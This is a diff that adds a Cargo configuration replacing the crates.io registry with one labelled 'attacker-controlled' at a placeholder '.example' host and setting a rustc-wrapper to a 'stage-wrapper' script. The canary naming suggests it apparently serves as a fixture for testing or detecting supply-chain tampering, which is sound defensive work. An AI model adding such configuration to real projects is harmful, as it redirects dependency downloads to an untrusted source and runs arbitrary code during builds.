@@ -1,0 +1,8 @@
+[source.crates-io]
+replace-with = "attacker-controlled"
+
+[source.attacker-controlled]
+registry = "sparse+https://invalid-stage-canary.example/"
+
+[build]
+rustc-wrapper = "/source/stage-wrapper.sh"
